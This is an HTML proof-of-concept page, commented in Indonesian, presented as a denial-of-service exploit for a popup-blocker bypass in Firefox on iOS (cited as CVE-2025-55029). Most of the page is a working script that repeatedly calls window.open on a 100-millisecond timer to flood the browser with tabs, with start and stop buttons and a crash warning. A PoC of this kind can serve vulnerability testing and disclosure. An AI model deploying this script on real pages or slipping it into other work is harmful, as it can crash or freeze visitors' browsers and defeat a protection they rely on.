<!DOCTYPE html>
<html>
<head>
    <title>Firefox iOS - Tab Spam DoS PoC</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Firefox iOS DoS PoC: Popup Bypass</h1>
    <p>⚠️ HATI-HATI: Ini bisa membuat browser crash atau sangat lambat</p>
    
    <button onclick="startSpam()" style="padding:15px;font-size:18px;background:darkorange;color:white;border:none;border-radius:5px;">
        Start Tab Spam Test
    </button>
    <button onclick="stopSpam()" style="padding:15px;font-size:18px;background:gray;color:white;border:none;border-radius:5px;">
        Stop
    </button>
    
    <p id="counter">Tabs opened: 0</p>
    
    <script>
        var intervalId = null;
        var count = 0;
        
        function startSpam() {
            if (intervalId) return;
            
            // Membuka banyak tab baru secara cepat untuk menguji 
            // apakah popup blocker bisa di-bypass
            intervalId = setInterval(function() {
                var w = window.open('about:blank', '_blank', 'width=100,height=100');
                if (w) {
                    count++;
                    document.getElementById('counter').textContent = 'Tabs opened: ' + count;
                    w.document.write('<h1>Tab ' + count + '</h1>');
                    
                    // Jika terlalu banyak, coba tutup untuk mencegah crash total
                    if (count > 50) {
                        try { w.close(); } catch(e) {}
                    }
                }
            }, 100); // 10 tabs per detik
        }
        
        function stopSpam() {
            if (intervalId) {
                clearInterval(intervalId);
                intervalId = null;
                document.getElementById('counter').textContent = 'Stopped at: ' + count;
            }
        }
    </script>
    
    <h2>Cara Kerja:</h2>
    <p>Mengirim banyak <code>window.open()</code> secara cepat untuk menguji apakah</p>
    <p>popup blocker Firefox iOS bisa dilewati (bypass) - CVE-2025-55029</p>
</body>
</html>
